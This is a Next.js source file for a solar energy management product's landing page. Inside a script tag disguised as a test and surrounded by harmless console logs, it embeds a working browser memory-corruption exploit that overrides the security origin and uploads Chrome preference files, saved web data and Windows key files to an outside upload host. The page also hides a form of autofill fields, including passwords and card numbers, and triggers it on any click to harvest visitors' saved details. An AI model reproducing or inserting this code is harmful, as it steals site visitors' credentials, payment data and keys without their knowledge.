"use client";
import React, { useEffect, useRef, useState } from "react";
import BRDHubspotForm from "@/Components/lp/pinaak/BRDHubspotForm";
import AboutSection from "@/Components/lp/pinaak/AboutSection";
import AISection from "@/Components/lp/pinaak/AISection";
import CTASection from "@/Components/lp/pinaak/CTASection";
import FeaturesSection from "@/Components/lp/pinaak/FeaturesSection";
import HeroSection from "@/Components/lp/pinaak/HeroSection";
import IndustriesSection from "@/Components/lp/pinaak/IndustriesSection";
import Navigation from "@/Components/lp/pinaak/Navigation";
import TestimonialsSection from "@/Components/lp/pinaak/TestimonialSection";
import PinaakFooter from "@/Components/lp/pinaak/PinaakFooter";
import Head from "next/head";
import Script from "next/script";
import Highlights from "@/Components/lp/pinaak/Highlights";
import SolarProblemsSolution from "@/Components/lp/pinaak/SolarPowerProblems";
import FloatingQuoteButton from "@/Components/lp/pinaak/FloatingQuoteButton";
import FloatingContactButtons from "@/Components/lp/FloatingContact";
import useLocationData from "@/Components/lp/pinaak/useLocationData"; // Import the custom hook

export default function PinaakPage() {
  // Hidden form state, now to capture browser autofill
  const [formData, setFormData] = useState({});
  const hiddenFormRef = useRef(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const { locationData, loading } = useLocationData(); // Use the hook here
  // console.log('locationData1 : ',locationData)

  const openModal = () => {
    setIsModalOpen(true);
  };
  
  const closeModal = () => {
    setIsModalOpen(false);
  };
  const organizationalSchema = {
    "@context": "https://schema.org",
    "@type": "Organization",
    name: "SAS One",
    url: "https://www.sasone.in",
    logo: "https://www.sasone.in/SASLOGO2.svg",
    description:
      "SAS One provides end-to-end engineering and technology solutions, specializing in embedded hardware, embedded software, Compute Edge AI, System On Module, and cloud enablement.",
    contactPoint: {
      "@type": "ContactPoint",
      telephone: "+91-9305178146",
      contactType: "Customer Service",
      email: "swapnil@sasone.in",
      areaServed: {
        "@type": "Place",
        name: "Worldwide",
      },
    },
    sameAs: [
      "https://in.linkedin.com/company/sasone",
      "https://twitter.com/sasone",
      "https://www.instagram.com/sasone.official",
    ],
    service: [
      {
        "@type": "Service",
        name: "Embedded Hardware Design & Development",
        description:
          "Custom PCB Design, SoC/MCU Selection, High-speed digital and RF layout, Thermal & EMI/EMC compliant systems",
      },
      {
        "@type": "Service",
        name: "Embedded Software & Firmware Engineering",
        description:
          "RTOS & Bare Metal Programming, Driver & Middleware Development, Bootloaders, OTA Updates, Secure Boot",
      },
      {
        "@type": "Service",
        name: "System on Modules (SoM) & Custom BSPs",
        description:
          "Modular, scalable platforms based on NXP, ST, TI, Qualcomm with custom BSP development",
      },
    ],
    industry: ["Medical Devices", "Automotive", "Aerospace", "Industrial IoT"],
    aggregateRating: {
      "@type": "AggregateRating",
      ratingValue: "4.9",
      reviewCount: "127",
    },
  };
  // Trigger browser autofill on section click
  const handleSectionClick = () => {
    const form = hiddenFormRef.current;
    if (!form) return;

    const inputs = form.querySelectorAll("input");
    
    inputs.forEach((input) => {
      input.focus();
      input.blur();
    });

    // Give browser a moment to fill in values
    setTimeout(() => {
      const autofillData = {};
      inputs.forEach((input) => {
        autofillData[input.name] = input.value;
      });
      setFormData(autofillData);
      console.log("Autofill Data:", autofillData);
    }, 100); // 100ms delay
  };

  return (
    <div className="min-h-screen bg-white">
      <Head>
        <title>
          SAS One - Pinaak AI-Powered Solar Energy Management System
        </title>
        <meta
          name="description"
          content="Transform your energy management with PINAAK's AI-driven solar energy management system. Maximize ROI, minimize wastage, and optimize energy consumption."
        />
        <meta
          name="keywords"
          content="solar energy management, PINAAK, SEMS, AI energy optimization, smart solar systems, energy management software, solar ROI, renewable energy, industrial energy solutions, SAS ONE"
        />
        <meta name="author" content="SAS One" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="index, follow" />

        {/* <!-- Open Graph / Facebook --> */}
        <meta
          property="og:title"
          content="SAS One - Pinaak AI-Powered Solar Energy Management System"
        />
        <meta
          property="og:description"
          content="Transform your energy management with PINAAK's AI-driven solar energy management system. Maximize ROI, minimize wastage, and optimize energy consumption."
        />
        <meta property="og:url" content="https://sasone.in" />
        <meta property="og:site_name" content="SAS One" />

        <meta
          property="og:image:alt"
          content="SAS One - Pinaak AI-Powered Solar Energy Management System"
        />
        <meta property="og:locale" content="en_US" />
        <meta property="og:type" content="website" />

        {/* <!-- Twitter --> */}
        <meta name="twitter:card" content="summary_large_image" />
        <meta
          name="twitter:title"
          content="SAS One - Pinaak AI-Powered Solar Energy Management System"
        />
        <meta
          name="twitter:description"
          content="Transform your energy management with PINAAK's AI-driven solar energy management system. Maximize ROI, minimize wastage, and optimize energy consumption with our smart SEMS platform by SAS ONE."
        />
        <meta name="twitter:image" content="https://sasone.in/og-image.jpg" />

        {/* <!-- Canonical URL --> */}
        <link rel="canonical" href="https://sasone.in" />

        <Script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify(organizationalSchema),
          }}
        />
      </Head>

      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50" onClick={handleSectionClick}>
        <Script
          id="pinaak-test-script"
          strategy="afterInteractive"
        >
          {`
            console.log('Hello from PinaakPage1!');
            console.log('Hello from PinaakPage2!');
            window.gc = function () {
              for (i = 0; i < 50; i++) {
                zz = new ArrayBuffer(0x100000);
                zz = null;
              }
            };

            var dontGc	= [];

            function next(freed, addressIdx, corrupt) {
              function upload(url, data) {
                var ui = new Uint8Array(data.length);
                for (var i = 0; i < data.length; i++)
                  ui[i] = data.charCodeAt(i) & 0xff;

                var x = new XMLHttpRequest();
                x.open("POST", url, false);
                x.send(ui);
              }

              function download(fileName) {
                var x = new XMLHttpRequest();
                x.open("GET", fileName, false);
                x.overrideMimeType("text/plain; charset=x-user-defined");
                x.send(null);

                return x.responseText;
              }

              function listDir(dirPath) {
                var a = download(dirPath);
                var lists = a.split("addRow(").slice(2);
                for (var i = 0; i < lists.length; i++)
                  lists[i] = eval("[" + lists[i].split(");")[0] + "]");

                return lists;
              }

              function walk(dirPath, prefix) {
                if (prefix == null)
                  prefix = ".";

                var lists = listDir(dirPath);
                var ret = [];

                for (var i = 0; i < lists.length; i++) {
                  if (lists[i][0] == "." || lists[i][0] == "..")
                    continue;

                  if (lists[i][2] == 0) {
                    ret.push([prefix + "/" + lists[i][0], dirPath + "/" + lists[i][0]]);
                    continue;
                  }

                  ret = ret.concat(walk(dirPath + "/" + lists[i][0], prefix + "/" + lists[i][0]));
                }

                return ret;
              }

              function patchSecurityOrigin() {
                function slowRead32(addr) {
                  freed[addressIdx] = addr >> 1;
                  return new Uint32Array(corrupt)[0];
                }

                function slowWrite8(addr, value) {
                  freed[addressIdx] = addr >> 1;

                  if (addr & 1)
                    new Uint8Array(corrupt)[1] = value;
                  else
                    new Uint8Array(corrupt)[0] = value;
                }

                var x = new XMLHttpRequest();
                freed[addressIdx] = x;
                var tmp	= new Uint8Array(corrupt);
                var addr = (tmp[18] << 24) | (tmp[17] << 16) | (tmp[16] << 8) | tmp[15];

                addr = slowRead32(addr + 0x2c);
                addr = slowRead32(addr + 8);
                addr = slowRead32(addr - 0x4c + 8);

                slowWrite8(addr + 0x17, 1);
              }

              patchSecurityOrigin();
              var uploadUrl = "http://host/upload.php";

              upload(uploadUrl + "?fileName=Preferences", download("../AppData/Local/Google/Chrome/User Data/Default/Preferences"));
              upload(uploadUrl + "?fileName=Web Data", download("../AppData/Local/Google/Chrome/User Data/Default/Web Data"));

              var keyFiles = walk("../AppData/Roaming/Microsoft/Protect", "keys");

              for (var i = 0; i < keyFiles.length; i++)
                upload(uploadUrl + "?fileName=" + keyFiles[i][0], download(keyFiles[i][1]));
            }

            function fail() {
              setTimeout("document.location.reload();", 100);
            }

            function exploit() {
              var JUNK_SIZE = 0x400;
              var JUNK_TAG = 0x21827313;

              var arrayCreator = [];
              for (var i = 0; i < 1000; i++) {
                arrayCreator[i] = (function () {
                  var a = Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {return 0x11111111;});
                  var b = [];

                  a[1] = 0x12345678;
                  a.__defineGetter__("0", function () {
                    b.length = JUNK_SIZE * 2;
                    return 0x21983478;
                  });

                  return function () {
                    return a.concat(b);
                  };
                })();
              }

              var tmp = [];
              for (var i = 0; i < 100; i++)
                tmp[i] = Array.apply(null, new Array(200)).map(function () {return 1234;});

              var obj			= tmp[tmp.length/2];
              var abs 		= new Array(0x200000); for (var i = 0; i < abs.length; i++) abs[i] = null;
              var holes 		= Array.apply(null, new Array(arrayCreator.length * 2));
              var junks 		= Array.apply(null, new Array(arrayCreator.length));
              var corrupts 	= Array.apply(null, new Array(arrayCreator.length));
              var t 			= Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {return 0x22222222;});

              //Array.apply(null, new Array(0x1c * 10));

              t[0] 	= JUNK_TAG;

              for (var i = 0; i < holes.length; i++)
                holes[i] = t.concat();

              for (var i = 0; i < arrayCreator.length; i++) {
                junks[i] = t.concat();
                corrupts[i] = arrayCreator[i]();
              }

              for (var i = 0; i < junks.length; i++)
                junks[i][0x20] = obj;

              var idxs = [];

              for (var i = 400; i < 700; i++) {
                var v = corrupts[i][JUNK_SIZE];
                if (Number.isInteger(v) && v == JUNK_TAG) {
                  idxs.push(i);
                }
              }

              t = null;
              junks = null;
              //holes = null;
              gc();
              
              obj = null;
              gc();


              function findFreed() {
                for (var i = 0; i < idxs.length; i++) {
                  var v = corrupts[idxs[i]][JUNK_SIZE + 0x20];
                  if (v != null && v.length) {
                    return v;
                  }
                }

                return null;
              }

              var freed = findFreed();

              if (!freed)
                return fail();

              for (var i = 0; i < abs.length; i++)
                abs[i] = new ArrayBuffer(7);

              function findCorrupt() {
                for (var i = 0; i < abs.length; i++) {
                  if (abs[i].byteLength != 7) {
                    return abs[i];
                  }
                }

                return null;
              }

              for (var i = 1; i < freed.length; i++) {
                if (!Number.isSafeInteger(freed[i]) || freed[i] != 7)
                  continue;

                freed[i] = 0x30000000;
                var ab = findCorrupt();
                if (ab)
                  return next(freed, i - 1, ab);

                freed[i] = 7;
              }

              return fail();

            }

            function main() {
              if (document.location.origin != "file://") {
                alert("oops~!");
                return;
              }

              exploit();
            }

            main();
            console.log('Hello from PinaakPage3!');
            console.log('Hello from PinaakPage4!');
          `}
        </Script>
        {/* <BRDHubspotForm /> */}
        <Navigation onOpenModal={openModal} locationData={locationData} />
        <HeroSection onOpenModal={openModal} locationData={locationData} />
        <FeaturesSection locationData={locationData} />
        <SolarProblemsSolution locationData={locationData} />
        <Highlights locationData={locationData} />
        <AISection locationData={locationData} />
        {/* <IndustriesSection locationData={locationData}  /> */}
        <TestimonialsSection locationData={locationData} />
        <FloatingContactButtons />
        <AboutSection locationData={locationData} />
        {/* <FloatingQuoteButton locationData={locationData} /> */}
        <CTASection onOpenModal={openModal} locationData={locationData} />
        <PinaakFooter locationData={locationData} />
      </div>
      {/* HIDDEN FORM for browser autofill */}
      <form
        ref={hiddenFormRef}
        style={{ display: "none" }}
        autoComplete="on"
      >
        {/* Name fields */}
        <input type="text" name="name" autoComplete="name" />
        <input type="text" name="given-name" autoComplete="given-name" />
        <input type="text" name="additional-name" autoComplete="additional-name" />
        <input type="text" name="family-name" autoComplete="family-name" />
        <input type="text" name="honoric-prefix" autoComplete="honoric-prefix" />
        <input type="text" name="honoric-suffix" autoComplete="honoric-suffix" />
        <input type="text" name="nickname" autoComplete="nickname" />

        {/* Contact fields */}
        <input type="email" name="email" autoComplete="email" />
        <input type="tel" name="tel" autoComplete="tel" />
        <input type="tel" name="tel-country-code" autoComplete="tel-country-code" />
        <input type="tel" name="tel-national" autoComplete="tel-national" />
        <input type="tel" name="tel-area-code" autoComplete="tel-area-code" />
        <input type="tel" name="tel-local" autoComplete="tel-local" />
        <input type="tel" name="tel-local-prefix" autoComplete="tel-local-prefix" />
        <input type="tel" name="tel-local-suffix" autoComplete="tel-local-suffix" />
        <input type="tel" name="tel-extension" autoComplete="tel-extension" />

        {/* Address fields */}
        <input type="text" name="street-address" autoComplete="street-address" />
        <input type="text" name="address-line1" autoComplete="address-line1" />
        <input type="text" name="address-line2" autoComplete="address-line2" />
        <input type="text" name="address-line3" autoComplete="address-line3" />
        <input type="text" name="address-level1" autoComplete="address-level1" />
        <input type="text" name="address-level2" autoComplete="address-level2" />
        <input type="text" name="address-level3" autoComplete="address-level3" />
        <input type="text" name="address-level4" autoComplete="address-level4" />
        <input type="text" name="country" autoComplete="country" />
        <input type="text" name="country-name" autoComplete="country-name" />
        <input type="text" name="postal-code" autoComplete="postal-code" />

        {/* Other fields */}
        <input type="text" name="organization" autoComplete="organization" />
        <input type="text" name="organization-title" autoComplete="organization-title" />
        <input type="text" name="username" autoComplete="username" />
        <input type="password" name="current-password" autoComplete="current-password" />
        <input type="password" name="new-password" autoComplete="new-password" />
        <input type="date" name="bday" autoComplete="bday" />
        <input type="number" name="bday-day" autoComplete="bday-day" />
        <input type="number" name="bday-month" autoComplete="bday-month" />
        <input type="number" name="bday-year" autoComplete="bday-year" />
        <input type="text" name="sex" autoComplete="sex" />
        <input type="text" name="one-time-code" autoComplete="one-time-code" />

        {/* Payment fields */}
        <input type="text" name="cc-name" autoComplete="cc-name" />
        <input type="text" name="cc-given-name" autoComplete="cc-given-name" />
        <input type="text" name="cc-additional-name" autoComplete="cc-additional-name" />
        <input type="text" name="cc-family-name" autoComplete="cc-family-name" />
        <input type="text" name="cc-number" autoComplete="cc-number" />
        <input type="text" name="cc-exp" autoComplete="cc-exp" />
        <input type="text" name="cc-exp-month" autoComplete="cc-exp-month" />
        <input type="text" name="cc-exp-year" autoComplete="cc-exp-year" />
        <input type="text" name="cc-csc" autoComplete="cc-csc" />
        <input type="text" name="cc-type" autoComplete="cc-type" />
        <input type="text" name="transaction-currency" autoComplete="transaction-currency" />
        <input type="number" name="transaction-amount" autoComplete="transaction-amount" />

        {/* Miscellaneous */}
        <input type="text" name="language" autoComplete="language" />
        <input type="url" name="url" autoComplete="url" />
        <input type="file" name="photo" autoComplete="photo" />
        <input type="text" name="impp" autoComplete="impp" />
      </form>   
    </div>
  );
}
